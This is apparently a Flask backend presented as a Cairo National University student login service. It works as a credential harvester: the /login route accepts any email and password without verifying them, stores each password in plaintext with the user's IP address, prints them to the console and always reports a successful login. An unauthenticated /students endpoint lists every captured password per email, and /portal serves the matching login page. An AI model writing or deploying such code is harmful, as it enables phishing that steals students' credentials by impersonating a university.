"""
Cairo National University - Student Login Backend
Flask + SQLite
Run: python app.py
"""

from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import os
import io
from datetime import datetime
from contextlib import contextmanager

import libsql

app = Flask(__name__)
CORS(app)  # Allow requests from the HTML frontend

TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL") or os.getenv("LIBSQL_URL")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN") or os.getenv("LIBSQL_AUTH_TOKEN")

# ── DATABASE SETUP ────────────────────────────────────────────────────────────

@contextmanager
def get_db():
    if not TURSO_DATABASE_URL or not TURSO_AUTH_TOKEN:
        raise RuntimeError("TURSO_DATABASE_URL and TURSO_AUTH_TOKEN must be set")

    conn = libsql.connect(
        TURSO_DATABASE_URL,
        auth_token=TURSO_AUTH_TOKEN
    )

    try:
        yield conn
    finally:
        conn.close()


def fetchone_dict(conn, query, params=()):
    cur = conn.execute(query, params)
    row = cur.fetchone()
    if row is None:
        return None
    cols = [d[0] for d in cur.description] if cur.description else []
    return dict(zip(cols, row))


def fetchall_dicts(conn, query, params=()):
    cur = conn.execute(query, params)
    rows = cur.fetchall()
    cols = [d[0] for d in cur.description] if cur.description else []
    return [dict(zip(cols, r)) for r in rows]

def init_db():
    """Create the students table if it doesn't exist."""
    with get_db() as conn:
        conn.execute("""
            CREATE TABLE IF NOT EXISTS students (
                id          INTEGER PRIMARY KEY AUTOINCREMENT,
                email       TEXT    NOT NULL,
                password    TEXT    NOT NULL,
                ip_address  TEXT,
                login_count INTEGER DEFAULT 1,
                first_login TEXT    NOT NULL,
                last_login  TEXT    NOT NULL
            )
        """)
        conn.commit()
    print("[DB] Database initialised ✓")

# ── ROUTES ────────────────────────────────────────────────────────────────────

@app.route("/login", methods=["POST"])
def login():
    """
    Accept any email + password.
    Always INSERT a new student record for every login request.
    This maintains a full history of all login attempts.
    """
    data = request.get_json(silent=True)
    if not data:
        return jsonify({"error": "Invalid request body"}), 400

    email    = (data.get("email", "") or "").strip().lower()
    password = (data.get("password", "") or "").strip()

    if not email or not password:
        return jsonify({"error": "Email and password are required"}), 400

    ip  = request.remote_addr
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with get_db() as conn:
        # Always insert a new record for each login request
        conn.execute("""
            INSERT INTO students (email, password, ip_address, first_login, last_login)
            VALUES (?, ?, ?, ?, ?)
        """, (email, password, ip, now, now))
        conn.commit()
        print(f"[LOGIN] {email} | pwd: {password} | ip: {ip} | {now}")

    return jsonify({
        "success": True,
        "action": "logged_in",
        "message": "Login recorded successfully"
    }), 200


@app.route("/students", methods=["GET"])
def list_students():
    """
    Admin endpoint — view aggregated login data by email.
    Shows all unique passwords used for each email address.
    """
    with get_db() as conn:
        students = fetchall_dicts(
            conn,
            """
            SELECT 
                MIN(id) as id,
                email, 
                GROUP_CONCAT(DISTINCT password) as passwords, 
                ip_address, 
                COUNT(*) as total_logins, 
                MIN(first_login) as first_login, 
                MAX(last_login) as last_login 
            FROM students 
            GROUP BY email 
            ORDER BY last_login DESC
            """,
        )
    
    # Optional: convert comma-separated passwords string back to a list
    for s in students:
        if s["passwords"]:
            s["passwords"] = s["passwords"].split(",")

    return jsonify({
        "total_unique_emails": len(students),
        "students": students
    }), 200


@app.route("/portal", methods=["GET"])
def portal():
    return send_file("index.html")


# ── DATABASE INITIALIZATION ───────────────────────────────────────────────────

# Create tables if they don't exist
with app.app_context():
    init_db()

# ── ENTRY POINT ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    print("=" * 55)
    print("  Cairo National University — Backend Server")
    print("  Running on  : http://localhost:5001")
    print("  Admin panel : http://localhost:5001/students")
    print("=" * 55)
    app.run(debug=False, host="0.0.0.0", port=5001)
